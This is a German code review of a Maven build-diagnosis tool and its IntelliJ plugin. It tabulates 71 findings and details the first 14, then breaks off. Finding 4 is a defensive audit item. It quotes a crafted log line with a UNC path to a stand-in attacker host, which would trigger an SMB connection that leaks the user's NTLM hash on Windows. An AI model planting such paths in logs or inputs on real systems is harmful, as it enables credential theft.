# Review: Fehler und Performance (2026-11-14, Stand 71794bc)

## Zusammenfassung

Der Code ist sorgfältig gebaut: Fehler werden in der Extension zuverlässig geschluckt, XXE ist überall abgeschaltet, `delete-files` ist gegen Path Traversal geschützt, PCE wird im Plugin nie geschluckt, und alle Kern-Tests laufen grün (200 Tests). Die gefährlichsten Befunde liegen dort, wo Dateien des Nutzers geschrieben werden. `FixExecutor` liest und schreibt jede Datei als UTF-8 und zerstört damit Umlaute in POMs mit `encoding="ISO-8859-1"`; in der IDE läuft der https-Fix für Repository-URLs genau über diesen Weg, am Editor vorbei, ohne Vorschau und ohne Undo (#1, #10). `PomEditor` erzeugt bei selbstschließenden Containern wie `<dependencies/>` doppelte Tags, die Maven nicht mehr lesen kann (#2). Bei der Diagnose fallen drei Dinge auf: Logs mit verbreiteten CI-Präfixen ergeben „keine Fehler“ (#8), allgemeine Muster wie `403 Forbidden` oder `ZipException` schlagen fehlgeschlagene Tests (#9), und der Preflight wertet auskommentierte bzw. nur in Profilen stehende `<release>`-Angaben als Anforderung (#5). Den größten Performance-Hebel haben zwei Stellen. Prüfungs-Regex mit `find()` über lange Zeilen ohne Leerzeichen wachsen quadratisch: eine 60.000-Zeichen-Zeile kostet 14,8 s am Build-Ende (#7). Und `JarIndex` liest `target/classes` der Reactor-Module bei jeder Abfrage neu: A3 und A5 brauchen je etwa 5 s bei 200 Modulen, und die Live-Inspection tut es im Daemon (#20).

## Übersicht

| # | Schwere | Kategorie | Sicherheit | Modul | Ort | Kurzbeschreibung |
|---|---|---|---|---|---|---|
| 1 | Kritisch | korrektheit | bestätigt | core | `fix/FixExecutor.java:67-104` | Fixes lesen/schreiben immer UTF-8 → Umlaute in Latin-1-POMs zerstört |
| 2 | Kritisch | korrektheit | bestätigt | core | `deps/PomEditor.java:737-754` | `<dependencies/>`, `<properties/>`, `<exclusions/>` → doppelter Container, POM unlesbar |
| 3 | Kritisch | korrektheit | bestätigt | core | `deps/PomEditor.java:160, 287` | Letzten Eintrag entfernen löscht Kommentare im Block (CLI ohne Undo) |
| 4 | Kritisch | sicherheit | plausibel | core | `check/RepositoryChecks.java:155-186`, `PomChecks`, `MavenLogParser:149` | UNC-Pfade aus dem Log → SMB-Zugriff/NTLM-Hash unter Windows |
| 5 | Hoch | korrektheit | bestätigt | core | `preflight/PreflightChecks.java:201-259` | Preflight wertet Kommentare, Profile und Nicht-Modul-POMs → falsches ROT |
| 6 | Hoch | korrektheit | bestätigt | core | `env/MavenSettings.java:152-174` | `${env.X}` in settings.xml nicht interpoliert → falsches ROT, falsches Repo |
| 7 | Hoch | performance | bestätigt | core | `check/ResolutionChecks.java:82`, `RuntimeChecks:86`, `RepositoryChecks:155`, Katalog `:96` | Regex O(L²) bei langen Zeilen: 60k Zeichen = 14,8 s |
| 8 | Hoch | korrektheit | bestätigt | core | `io/MavenLogParser.java:22-28`, `LogOutline.java:21` | Zeitstempel mit Leerzeichen/Thread-Präfix → „keine Fehler“ |
| 9 | Hoch | korrektheit | bestätigt | core | Katalog `build-doctor-v1.yaml:66-93` | `403 Forbidden`/`ZipException` aus Tests → falsche Hauptdiagnose |
| 10 | Hoch | korrektheit, regelverstoß | bestätigt | plugin, core | `FixRunner.java:65`, `FixExecutor.java:65-74`, `RepositoryChecks.java:114-136` | https-Fix schreibt POM am Editor vorbei, ersetzt auch Präfix-Treffer |
| 11 | Hoch | korrektheit | bestätigt | core | `check/PomChecks.java:311-328` | `plugin-version` bestätigt ohne Prüfung → falscher Fix „Version einfügen“ |
| 12 | Hoch | korrektheit | bestätigt | plugin | `BuildDoctorService.java:213` | Diagnose von IDE-Läufen ignoriert IDE-Settings-Datei und -Repository |
| 13 | Hoch | korrektheit | bestätigt | plugin | `FixRunner.java:172-177` | `delete-files` verweigert bei `<localRepository>` ≠ `~/.m2/repository` |
| 14 | Hoch | korrektheit | bestätigt | core | `deps/PomLocator.java:155` | `${revision}`: Reactor-Geschwister „fehlen“, Baum unvollständig |
| 15 | Hoch | korrektheit | bestätigt | core | `PomEditor.java:481-503`, `DependencyUsage.java:269-273, 673-683` | `type` (test-jar) ignoriert → UNUSED-Fix entfernt das genutzte jar |
| 16 | Hoch | korrektheit | bestätigt | core | `EffectiveModel.java:230-241` + 8 Aufrufer | Management-Lookup ignoriert type/classifier → falscher Scope, falsche Diagnose |
| 17 | Hoch | korrektheit | bestätigt | core | `ExclusionAudit.java:303-339`, `DependencyResolver.java:150-165` | Relocation ignoriert → Exclusion fälschlich STALE |
| 18 | Hoch | korrektheit | bestätigt | core | `ExclusionAudit.java:314` | Profil-Dependencies fehlen → Exclusion fälschlich STALE |
| 19 | Hoch | korrektheit | bestätigt | core | `maven-extension/…/Snapshots.java:101-106`, `snapshot/SnapshotStore.java:81-94` | Grünes `compile` nach grünem `verify` dünnt Referenz aus → erfundene Änderungen |
| 20 | Hoch | performance | bestätigt | core, plugin | `JarIndex.java:128-131`, `DuplicateClasses:309`, `DependencyUsage:593, 693` | Verzeichnisse nie gecacht: A3/A5 je ~5 s, Inspection liest im Daemon |
| 21 | Mittel | threading | bestätigt | plugin | `ui/DetectivePanel.java:352-364, 420-465`, `IdeUsages.java:66-74` | „Stop“ verwirft nur Ergebnis; Ladeanzeige und „läuft“ hängen weiter |
| 22 | Mittel | korrektheit | bestätigt | plugin | `ui/FindingTree.java:109-132` | Abgewählte Häkchen kommen nach Suche/Reimport zurück |
| 23 | Mittel | korrektheit | bestätigt | plugin | `AnalysisResults.java:124-131`, `DependencyUsagePanel.java:114-162` | Vor dem Import gestartete Analyse gilt danach als aktuell |
| 24 | Mittel | robustheit | bestätigt | plugin | `BuildDoctorPanel:302-341`, `OverviewPanel:271-326`, `UpgradeSimulatorPanel:397` | Lade-/„läuft“-Zustände bleiben nach Fehler oder Abbruch stehen |
| 25 | Mittel | korrektheit | bestätigt | plugin | `PomInsights.java:104-153` | Verworfene Matrix wird nie neu angestoßen → Code Vision verschwindet |
| 26 | Mittel | korrektheit | bestätigt | plugin | `BuildDoctorService.java:358-363`, `FixRunner.java:94, 137` | Benachrichtigungen setzen Text mit `<server>` ungeescaped als HTML |
| 27 | Mittel | korrektheit | bestätigt | plugin | `BuildFailureConsoleFilter.java:68` | Konsolen-Link zeigt neueste Diagnose, nicht die dieser Konsole |
| 28 | Mittel | performance | bestätigt | plugin | `IdeMaven.java:458-466` | Nach jedem POM-Fix voller, erzwungener Sync aller Maven-Projekte |
| 29 | Mittel | performance | bestätigt | plugin | `PomInsights.java:162-165`, `StaleExclusionInspection.java:58` | Editor-Caches am globalen VFS-Zähler; jede Neuberechnung scannt den Reactor |
| 30 | Mittel | speicher | bestätigt | plugin, core | `ClasspathChecks.java:46`, `IdeUsages.java:46`, 3× `PomCache` | Statische Caches mehrfach, nie geleert, bis ~50 MB je Index |
| 31 | Mittel | korrektheit | bestätigt | core | `deps/MavenVersion.java:61-118` | 13 von 58 Vergleichen weichen von `ComparableVersion` ab |
| 32 | Mittel | korrektheit | bestätigt | core | `PomEditor.java:147-487` | `${project.groupId}` in Deklaration → POM-Fixes „nicht gefunden“ |
| 33 | Mittel | korrektheit | bestätigt | core | `PomFile.java:289`, `PomEditor.java:783` | Doppelte Property: Tool nimmt erste, Maven letzte |
| 34 | Mittel | robustheit | bestätigt | core | `PomFile.java:151-159` | UTF-8-BOM → Upgrade-Simulation „kein gültiges XML“ |
| 35 | Mittel | speicher | bestätigt | core | `EffectiveModel.java:299-322` | Selbstbezügliche Property → OOM nach 7,8 s |
| 36 | Mittel | korrektheit | bestätigt | core | `fix/FixExecutor.java:80-92` | `set-jvm-option` fügt `.mvn/jvm.config` zu einer Zeile zusammen |
| 37 | Mittel | korrektheit | bestätigt | core | `RuntimeChecks:86`, `RepositoryChecks:155`, `PomChecks:34`, Katalog | Pfade mit Leerzeichen werden abgeschnitten |
| 38 | Mittel | korrektheit | bestätigt | core | `io/MavenLogParser.java:84-97` | Ausnahmen in Zeilen ohne Präfix → Karte bei `BUILD SUCCESS` |
| 39 | Mittel | korrektheit | bestätigt | core | `io/MavenLogParser.java:26-28, 135-152` | Maven-/Java-Version nur ohne Zeilenpräfix gelesen |
| 40 | Mittel | speicher | bestätigt | core | `io/MavenLogParser.java:40, 60-62` | Ungenutzte `logLines` (20.000 Zeilen) – 20 Läufe = 60 MB |
| 41 | Mittel | korrektheit | bestätigt | core | `ExclusionAudit.java:175` | Exclusion im Parent nur im Kontext des Parents geprüft → STALE falsch |
| 42 | Mittel | korrektheit | bestätigt | core | `DependencyResolver.java:182`, `ExclusionAudit.Closure:333` | Exclusions aus dem Management der Dependency-POM fehlen |
| 43 | Mittel | korrektheit, performance | bestätigt | core | `ModuleClasspath.java:245-303` | Classpath ohne Baum (`fromPoms`) weicht von Maven ab und ist 2× langsamer |
| 44 | Mittel | korrektheit | bestätigt | core | `DependencyUsage.java:640-655` | Klasse in zwei JARs → deklarierte Dep sicher UNUSED |
| 45 | Mittel | performance | bestätigt | core | `EffectiveModel.managed`, `PomLocator.byCoordinates:154` | Lineare Suchen = ~80 % CPU in Resolver/Matrix/Simulator |
| 46 | Mittel | performance, speicher | bestätigt | core, plugin | `UpgradeSimulator.java:507-551`, `UpgradeSimulatorPanel:414` | A6 parst alles neu, hält ~98 MB, nicht abbrechbar |
| 47 | Mittel | korrektheit | bestätigt | core | `env/BuildSetup.java:190` | Maven Wrapper 3.3.x (`dists/apache-maven-X/`) nicht gefunden |
| 48 | Mittel | threading | plausibel | extension | `DetectiveEventSpy.java:278-290` | JSONL ohne Synchronisation → zerrissene Zeilen unter `-T` |
| 49 | Mittel | sicherheit | plausibel | core | `preflight/RepositoryProbe.java:59-66` | HEAD-Probe nutzt JVM-`Authenticator` der IDE → evtl. Zugangsdaten |
| 50 | Mittel | threading | plausibel | plugin | `LogNavigatorView.java:134-211`, `BuildDoctorActions:52` | Großes Log wird komplett auf dem EDT aufgebaut |
| 51 | Mittel | speicher | plausibel | plugin | `BuildDoctorService.java:59-129`, `MavenRunListener:110` | Verlauf hält 20 `ExecutionEnvironment`s und Rohlogs (UTF-16) |
| 52 | Mittel | robustheit | plausibel | plugin | `ui/DetectivePanel.java:432-438` | `Error` im Hintergrund → Ladeanzeige für immer |
| 53 | Mittel | robustheit | plausibel | plugin | `FixRunner.java:396-407` | Schreibschutz ungeprüft → halber Mehrdatei-Fix |
| 54 | Mittel | korrektheit | plausibel | extension | `Snapshots.java:87, 123-134` | Effective-POM-Hash am Build-Ende enthält Laufzeit-Properties |
| 55 | Mittel | korrektheit | plausibel | core | `env/BuildSetup.java:262-304` | Homebrew-Maven: Version unbekannt, keine globale settings.xml |
| 56 | Mittel | korrektheit | plausibel | core | `preflight/VersionRange.java:526` | Enforcer `requireJavaVersion 8` → falsches ERROR auf Java 8 |
| 57 | Mittel | robustheit | plausibel | core | `deps/PomFetcher.java:225-235` | Abbruch beendet `mvn.cmd` unter Windows nicht |
| 58 | Niedrig | regelverstoß | bestätigt | alle | siehe Befund | Sichtbare Texte/Farben im Code an 13 Stellen |
| 59 | Niedrig | regelverstoß | bestätigt | plugin | `BuildDoctorService`, `MavenRunListener`, `FixRunner` | Maven-API außerhalb von `IdeMaven` |
| 60 | Niedrig | regelverstoß | bestätigt | plugin | `StaleExclusionInspection.java:155-166` | Quick-Fix ändert POM per PSI, ohne `editPoms`/Reimport |
| 61 | Niedrig | sicherheit | bestätigt | core | `PomFetcher.java:41-160`, `PomEditor.java:404-550` | Werte ungeescaped in XML; auskommentierte `<repositories>` übernommen |
| 62 | Niedrig | korrektheit | bestätigt | core | `PomEditor.java:382, 776` | Entity/CDATA im Wert „nicht gefunden“; Kommentar in `<version>` gelöscht |
| 63 | Niedrig | korrektheit | bestätigt | core | `deps/SourceScanner.java:203-224` | Textblock mit `\"""`, Kotlin-`${…}` → Nutzungen verloren |
| 64 | Niedrig | korrektheit | bestätigt | core | `DependencyResolver.java:217, 276` | Zyklus zur Wurzel → Modul steht im eigenen Baum |
| 65 | Niedrig | robustheit | bestätigt | core | `io/Json.java:45-173`, `EventLog.java:70` | Keine Tiefengrenze (StackOverflowError), große Zahlen verwerfen Zeile |
| 66 | Niedrig | korrektheit | bestätigt | core | `preflight/RemoteRepositories.java:482-495`, `env/MavenSettings.java:202` | Proxy-/Mirror-Auswahl weicht von Maven ab |
| 67 | Niedrig | korrektheit | bestätigt | core | `env/BuildSetup.java:162`, `PreflightContext:468` | Relatives `-Dmaven.repo.local` gegen falsches Verzeichnis aufgelöst |
| 68 | Niedrig | robustheit | bestätigt | core | mehrere | Kleinere Robustheitspunkte (DependencyTreeParser, JarIndex, ClassFile, Katalog-BOM, Template, Coordinates, 600-JAR-Grenze, system-Scope) |
| 69 | Niedrig | korrektheit | bestätigt | plugin | mehrere | Kleinere UI-Fehler (Preflight-Auswahl, Spaltenbreiten, Übernehmen trotz veraltet, Strg+C, Ansichtssprung …) |
| 70 | Niedrig | performance | bestätigt | core, plugin | `SnapshotDiff:388`, `DiagnosisCard:456`, `ConflictMatrixPanel:578` | Lineare Suche im Snapshot-Diff, Regex über ganzes Log auf dem EDT, teurer Renderer |
| 71 | Niedrig | sicherheit, robustheit | plausibel | core | `SnapshotStore.java:52`, `Snapshots.java:72` | Ablage-Schlüssel nicht kanonisch, wächst unbegrenzt; Zugangsdaten in Mirror-URLs im Klartext |

## Befunde

### 1. `FixExecutor` liest und schreibt immer UTF-8 → Umlaute in Nicht-UTF-8-Dateien zerstört
- **Ort:** `core/src/main/java/io/github/bitshiftdev/mavendetective/core/fix/FixExecutor.java:67,72` (`replace-in-file`), `:80,92` (`set-jvm-option`), `:97,104` (POM-Fixes). Erreicht aus der IDE über `FixRunner.runFileFix` (`FixRunner.java:104-140`), aus der CLI über `analyze --remove/--declare`, `exclusions --remove`, `duplicates --exclude`, `upgrade --apply`, `matrix --pin`.
- **Problem:** `new String(Files.readAllBytes(p), UTF_8)` → Edit → `getBytes(UTF_8)`. Die Kodierung aus BOM bzw. XML-Deklaration wird nicht beachtet. Ungültige Bytes werden beim Dekodieren zu U+FFFD und sind danach verloren.
- **Szenario:** Eine POM mit `<?xml version="1.0" encoding="ISO-8859-1"?>` und `<name>Größenprüfung Müller</name>`. Nach einem `set-version`-Fix steht `Grï¿½ï¿½enprï¿½fung Mï¿½ller` in der Datei. In der IDE trifft das den https-Fix (#10), dort ohne Undo.
- **Beleg:** `xxd` vorher `4d fc 6c`, nachher `4d ef bf bd` (Repros `scratchpad/core-pom/.../Repro2.java`, `scratchpad/plugin-a/ReplaceRepro.java`, `scratchpad/core-log/Repro.java latin1`).
- **Vorschlag:** Kodierung aus BOM/Prolog bestimmen und in derselben zurückschreiben. Zusätzlich mit `CharsetDecoder`/`CodingErrorAction.REPORT` dekodieren und bei Fehlern abbrechen statt zu schreiben. Test in `FixExecutorTest` mit Latin-1-POM. Aufwand M.

### 2. Selbstschließende Container führen zu doppelten Tags
- **Ort:** `core/.../deps/PomEditor.java:737-754` (Scan merkt bei `empty` keinen Range), Folgen in `:92-121`, `:216`, `:254`, `:405`.
- **Problem:** Bei `<dependencies/>`, `<exclusions/>`, `<properties/>`, `<dependencyManagement/>` und `<dependencyManagement><dependencies/></dependencyManagement>` bleiben die Ranges leer. `addDependency`, `addExclusion`, `setProperty` und `pinManagedVersion` legen deshalb einen zweiten Container gleichen Namens an.
- **Szenario:** `analyze --declare` bzw. der Quick-Fix „Deklarieren“ auf einer POM mit `<dependencies/>`. Danach meldet Maven `Duplicated tag: 'dependencies'`, der Build ist kaputt.
- **Beleg:** Selbst nachgestellt (`scratchpad/me/MyPom.java`):
  ```
  <dependencies/>
  <dependencies>
    <dependency>…g:a:1.0…</dependency>
  </dependencies>
  ```
  Bei `setProperty` auf `<properties/>` entsteht entsprechend ein zweites `<properties>`. `MavenXpp3Reader` (strict) lehnt alle vier Fälle ab.
- **Vorschlag:** Im Scan bei `empty` den Range des leeren Tags merken und `<x/>` durch `<x>…</x>` ersetzen. Je ein Fall in `PomEditorTest`. Aufwand S–M.

### 3. Entfernen des letzten Eintrags löscht Kommentare im Container
- **Ort:** `core/.../deps/PomEditor.java:160` (`removeExclusion`), `:287` (`removeDependency`).
- **Problem:** Ist es der letzte Eintrag, wird der ganze `<exclusions>`- bzw. `<dependencies>`-Block gelöscht, auch wenn darin noch Kommentare stehen.
- **Szenario:** `<dependencies>` enthält eine auskommentierte alte Dependency und g:a. `analyze --remove` (CLI, kein Undo) entfernt g:a; der Kommentar mit der alten Dependency ist weg. Im Plugin fangen Vorschau und Undo das ab.
- **Beleg:** Selbst nachgestellt: aus `<project><dependencies><!-- <dependency>…old:x… --><dependency>g:a</dependency></dependencies></project>` wird `<project>\n</project>`.
- **Vorschlag:** Container nur entfernen, wenn außer Whitespace nichts übrig bleibt; sonst nur das Element. Aufwand S.

### 4. UNC-Pfade aus dem Log führen unter Windows zu Netzzugriff
- **Ort:** Katalog `build-doctor-v1.yaml:92,96` (corrupt-jar `extract`), `check/RepositoryChecks.java:155,164-168,179-186` (`Files.isRegularFile`, `ZipFile`, SHA-1), `check/PomChecks.java:62-65,85-88,108-110,164-166`, `io/MavenLogParser.java:149-151` mit `env/Environment.forBuild:67-68` (`Maven home:`).
- **Problem:** Pfade aus dem Logtext gehen ungeprüft an `Files.*`. Unter Windows ist `\\host\share\x.jar` ein UNC-Pfad; der erste Zugriff baut eine SMB-Verbindung auf und sendet den NTLM-Hash des Nutzers. Das verletzt auch die Regel „Prüfungen gehen nie ins Netz“.
- **Szenario:** Ein fremdes Log (CI-Download, Zwischenablage, Test-Ausgabe mit Fremddaten) enthält `[ERROR] … error reading \\attacker.example\share\evil.jar; zip END header not found`. Die Prüfung `corrupt-jar` öffnet die Datei. Ebenso führt `Maven home: \\attacker\share` dazu, dass `conf/settings.xml` von dort gelesen wird.
- **Beleg:** `scratchpad/core-log/Unc.java`: `extract {file=\\attacker.example\share\evil.jar}`, `globalSettings=\\attacker.example\share/conf/settings.xml`. Den SMB-Zugriff selbst habe ich nicht unter Windows nachgestellt.
- **Vorschlag:** Zentraler Helfer (z. B. `Text.localPath`), der `\\…`, `//…` und andere Nicht-Laufwerkspfade ablehnt, bevor ein `Files.*` läuft; für Log-Variablen und Session-Hinweise. Test mit UNC-Log in `ChecksTest`. Aufwand S.

### 5. Preflight wertet Kommentare, Profile und Nicht-Modul-POMs → falsches ROT
- **Ort:** `core/.../preflight/PreflightChecks.java:201-217` (`<release>` per Zeilen-Regex), `:236-259` (Enforcer per `findText`), `:136`, `:326-357`; `PreflightContext.java:504`. Alles über `ProjectPoms.all()` (Verzeichnis-Scan bis Tiefe 6, nicht über `<modules>`).
- **Problem:** Kommentare und `<profiles>` werden nicht ausgeblendet; jede `pom.xml` unterhalb des Projekts zählt.
- **Szenario:** Alle Fälle mit JDK 17 nachgestellt:
  - (a) `<!-- <release>21</release> -->` → „JDK 17 ist zu alt: das Projekt verlangt Java 21“.
  - (b) `<release>21` nur im Profil `jdk21` → dieselbe Meldung.
  - (c) Auskommentierte `requireJavaVersion [21,)` → „Enforcer lehnt Java 17.0.9 ab“.
  - (d) `examples/legacy/pom.xml` ist kein Modul → wird trotzdem gewertet.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-env/src/repro/ReproPreflight.java`), alle drei Fälle mit `ERROR JDK …`, Ampel ROT.
- **Vorschlag:** Release, Enforcer und Toolchains aus `PomFile`/`EffectiveModel` ohne Profile lesen; Projekt-POMs über `<modules>` ab der Wurzel bestimmen. Tests in `PreflightTest`. Aufwand M.

### 6. Platzhalter in settings.xml werden nicht interpoliert
- **Ort:** `core/.../env/MavenSettings.java:152,169-174` (Mirror-URL, Proxy-Host, `localRepository` roh), `PreflightContext.java:480` und `Environment.java:350` (nur `${user.home}`); `Preflight.Options.env` (`Preflight.java:233,257`) wird nirgends genutzt.
- **Szenario:**
  - Mirror `<url>${env.NEXUS_URL}/repository/maven-public/</url>` mit `--network` → `ERROR REPOSITORY: central über Mirror nexus: Anfrage an null gescheitert`, Ampel ROT, obwohl Maven funktioniert.
  - `<localRepository>${env.HOME}/m2repo</localRepository>` → relativer Pfad `${env.HOME}/m2repo`. Danach meldet der Preflight Parents als fehlend, und die `.lastUpdated`-Prüfungen der Karte suchen im falschen Verzeichnis.
- **Beleg:** Selbst ausgeführt (`ReproPreflight` Fälle 2 und 3).
- **Vorschlag:** Interpolation wie Maven (`${env.*}`, `${user.home}`, System-Properties) aus `Options.env` bzw. `System.getenv`. Wo danach noch `${` steht, den Wert als unbekannt behandeln: nicht anfragen, kein ERROR. Aufwand S–M.

### 7. Prüfungs-Regex wachsen quadratisch mit der Länge einer Zeile ohne Leerzeichen
- **Ort:** `core/.../check/ResolutionChecks.java:82-83` (`UNKNOWN_HOST` `(\S+?): …`), `RuntimeChecks.java:86` (`LOCATION`), `RepositoryChecks.java:155` (`PATH`), Katalog `build-doctor-v1.yaml:96` (corrupt-jar `extract`). `ctx.find` läuft über alle Fehlerzeilen.
- **Problem:** `find()` startet an jeder Position eines langen Tokens und läuft bis zu dessen Ende, also O(L²) je Zeile. Die Extension diagnostiziert synchron am Build-Ende; der Build „hängt“ dann nach `BUILD FAILURE`.
- **Szenario:** Fortsetzungszeile nach `[ERROR]` mit 60.000 Zeichen Classpath, Base64- oder Minified-Text; `network-failure` läuft bei `artifact-not-resolvable` und `invalid-pom`.
- **Beleg:** Selbst gemessen mit `Main diagnose`: 20.000 Zeichen 1,3 s, 60.000 Zeichen 14,8 s. Einzelne Regex bei 40.000 Zeichen 2–9 s (`scratchpad/core-log/RegexBench.java`).
- **Vorschlag:** Starts nur an Tokengrenzen (`(?<!\S)(\S+?): …`), vorher per `contains` auf das Literal filtern, durchsuchbare Zeilen auf z. B. 4 KB kürzen (`BuildFailure.searchableLines`). Test mit langer Zeile und Zeitgrenze in `ChecksTest`. Aufwand S.

### 8. Logs mit verbreiteten CI-Präfixen ergeben „keine Fehler“
- **Ort:** `core/.../io/MavenLogParser.java:22-23` und `LogOutline.java:21-22` (gemeinsames `PREFIX`), CLI `Main.java:168-171`.
- **Problem:** Vor `[LEVEL]` ist nur ein einzelnes Token ohne Leerzeichen erlaubt, das `hh:mm:ss` enthält.
- **Szenario:** Nicht erkannt werden:
  - `2026-11-12 06:48:01 [ERROR]` (simplelogger mit Datum, Bamboo)
  - GitLab-17-Zeitstempel (`…Z 01O [ERROR]`)
  - `[main] [ERROR]` (`showThreadName=true`)
  - `1234 [ERROR]` (showDateTime ohne Format)

  Ergebnis: 0 Fehler, `diagnose` meldet „keine Fehler“ mit Exit 0, und die Outline hat weder ersten Fehler noch Ergebnis.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-log/FormatCheck.java`): `yyyy-MM-dd HH:mm:ss errors=0 rule=- firstError=-1 result=null`, ebenso für GitLab, Millis, Thread-Name, Zeit + Thread. GitHub-ISO, Jenkins `[ISO]` und `HH:mm:ss` funktionieren.
- **Vorschlag:** Präfix verallgemeinern (begrenzt viele Tokens vor `[LEVEL]`) oder bekannte Präfixe vorher abschneiden. Erkennt `diagnose` keinen Fehler, obwohl `BUILD FAILURE` im Log steht, nicht „keine Fehler“ melden. Testlogs je Format in `core/src/test/resources/logs`. Aufwand S.

### 9. Allgemeine Muster hochpriorer Regeln schlagen fehlgeschlagene Tests
- **Ort:** Katalog `build-doctor-v1.yaml:66,68` (`repository-access-denied`, Priorität 92) und `:87-93` (`corrupt-jar`, 90) gegen `test-failures` (`:442`, Priorität 10); Auswahl `BuildDoctor.java:80-93`.
- **Szenario:**
  - Ein Integrationstest scheitert mit `WebClientResponseException$Forbidden: 403 Forbidden from GET http://localhost:8080/api/user`. Hauptdiagnose: „Repository antwortet mit 403 – Zugangsdaten in settings.xml prüfen“.
  - Ein Unit-Test scheitert mit `java.util.zip.ZipException: invalid LOC header` aus Anwendungscode. Hauptdiagnose: „JAR im lokalen Repository beschädigt“.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-log/Repro.java forbidden`): `PRIMÄR repository-access-denied (LIKELY)` bzw. `PRIMÄR corrupt-jar (LIKELY)`, `test-failures (CERTAIN)` erscheint nur unter „auch“.
- **Vorschlag:** Muster an Maven-Kontext binden (`Could not transfer`, `Failed to deploy`, `from/to <repo>`, `.m2`) bzw. Treffer innerhalb von Surefire-Fehlerblöcken per `unless` ausschließen; außerdem sollte eine LIKELY-Regel eine CERTAIN-Regel nicht schlagen. Testlogs für beide Fälle. Aufwand M.

### 10. https-Fix für Repository-URLs schreibt die POM am Editor vorbei und ersetzt zu viel
- **Ort:** `intellij-plugin/.../idea/FixRunner.java:65` → `runFileFix` (`:104-140`) → `core/.../fix/FixExecutor.java:65-74`. Die Fixes entstehen in `check/RepositoryChecks.java:114-136` und `preflight/RemoteRepositories.java:272`.
- **Problem:**
  - `replace-in-file` auf eine Projekt-POM läuft nicht über `FixRunner.editPoms`: kein Diff, kein Undo-Schritt, kein Reimport. Das widerspricht der Regel „Jede POM-Änderung mit Vorschau“.
  - Kodierung kaputt wie in #1.
  - `content.replace(search, …)` ersetzt jedes Vorkommen, auch Präfix-Treffer und Kommentare.
- **Szenario:** Blockiertes Repository `http://nexus.corp/repo`. Die POM enthält außerdem `http://nexus.corp/repository/thirdparty` und einen Kommentar mit `…/repo-guide.html`. Alle drei werden https. Kann das zweite Repository kein https, ist der Build neu kaputt, und Undo geht nicht.
- **Beleg:** `scratchpad/core-log/Repro.java http` (Dateiinhalt nach Fix), `scratchpad/plugin-a/ReplaceRepro.java`.
- **Vorschlag:** Für `pom.xml` als `PomEditor`-Edit genau des `<url>`-Werts über `editPoms` ausführen. Für settings.xml nur exakte `<url>`-Werte ersetzen und die Kodierung erhalten. Aufwand M.

### 11. Prüfung `plugin-version` bestätigt ohne Prüfung und liefert einen falschen Fix
- **Ort:** `core/.../check/PomChecks.java:311-328`.
- **Problem:**
  - Die Prüfung läuft für jedes Muster der Regel `plugin-missing` und bestätigt, sobald `<artifactId>X</artifactId>` irgendwo steht. Ob `<version>` fehlt, prüft sie nicht.
  - Bei `g:a:v` aus „Could not find goal“ ergibt `substring(':')` den Wert `a:v`, und die Prüfung meldet „Plugin ist in keiner Projekt-POM eingetragen“.
- **Szenario:** `No plugin found for prefix 'spring-boot'`, das Plugin steht mit `<version>3.3.5</version>` im Modul web. Die Karte (CERTAIN) zeigt die Belege „Plugin ohne <version> (web/pom.xml:4)“ und den Fix `insert-plugin-version`.
- **Beleg:** Selbst ausgeführt (`Repro.java prefix`): `fix: Version für org.springframework.boot:spring-boot-maven-plugin einfügen [insert-plugin-version …]`, `ev: Plugin ohne <version>`.
- **Vorschlag:** Nur laufen, wenn das Muster `build.plugins.plugin.version` getroffen hat; im gefundenen `<plugin>`-Block auf `<version>` prüfen; artifactId als zweites Segment von `g:a[:v]`. Test in `ChecksTest`. Aufwand S.

### 12. Diagnose von IDE-Läufen ignoriert die Maven-Einstellungen der IDE
- **Ort:** `intellij-plugin/.../idea/BuildDoctorService.java:213-214` → `core/.../env/Environment.java:37-38,84-90`. `MavenLogParser` setzt nie User-Settings oder lokales Repository.
- **Problem:** `Environment.forBuild(failure, projectDir())` sieht immer `~/.m2/settings.xml` und das Repository daraus bzw. `~/.m2/repository`. `IdeMaven.ideSetup` kennt die Override-Datei, das Repository und das Runner-JDK (`IdeMaven.java:145-169`), wird hier aber nicht genutzt.
- **Szenario:** In der IDE ist `/corp/settings.xml` mit `<server id="nexus">` eingestellt, der Build scheitert mit 401. Die Prüfung liest `~/.m2/settings.xml` und meldet sicher „settings.xml has no <server> with the ID 'nexus'“; der Fix öffnet die falsche Datei. Analog sucht die `.lastUpdated`-Prüfung im falschen Repository.
- **Beleg:** Code gelesen, Aufrufkette wie oben.
- **Vorschlag:** In `analyzeLog` User-Settings, lokales Repository und Runner-Java aus `IdeMaven.ideSetup` in den `Environment.Builder` übernehmen. Aufwand S–M.

### 13. `delete-files` wird bei abweichendem lokalem Repository verweigert
- **Ort:** `intellij-plugin/.../idea/FixRunner.java:172-177` gegen `core/.../fix/FixExecutor.java:122-128`.
- **Problem:** Die Lösch-Wurzel ist `failure.getSession().getLocalRepository()`, bei Text-Logs (IDE) immer `null`, also `~/.m2/repository`. Die Prüfungen finden die Dateien aber über `env.getLocalRepository()`, inklusive `<localRepository>` aus settings.xml.
- **Szenario:** `<localRepository>/data/m2</localRepository>`. Die Diagnose bietet an, `/data/m2/…/x.jar.lastUpdated` zu löschen; `FixExecutor` wirft `exec.delete.refused`, es erscheint eine Fehlermeldung, nichts wird gelöscht.
- **Beleg:** `roots.add(repo != null ? Paths.get(repo) : Paths.get(System.getProperty("user.home"), ".m2", "repository"))`.
- **Vorschlag:** Das Repository, mit dem die Diagnose gerechnet hat, am `Result` mitgeben (plus `IdeMaven.localRepository`). Zusammen mit #12 lösen. Aufwand S.

### 14. CI-friendly `${revision}`: Reactor-Geschwister werden nicht gefunden
- **Ort:** `core/.../deps/PomLocator.java:155` vergleicht die interpolierte Version mit der rohen `p.effectiveVersion()` (`${revision}`).
- **Szenario:** Wurzel mit `<revision>1.0-SNAPSHOT</revision>`, Modul b hängt an a mit `${project.version}`. a wird als fehlend gemeldet, die transitiven Dependencies von a fehlen im Baum. Liegt eine alte installierte Fassung in `~/.m2`, wird diese veraltete POM genommen. Betroffen sind A1, A3, A5, A6 und `class-origin`; A6 schlägt `--fetch` für ein Reactor-Artefakt vor.
- **Beleg:** Selbst ausgeführt (`scratchpad/core-pom/.../RevisionCase.java`): `missing: [g:a:1.0-SNAPSHOT]`, Baum `g:b:${revision}` → `g:a:1.0-SNAPSHOT` ohne `org.x:lib`.
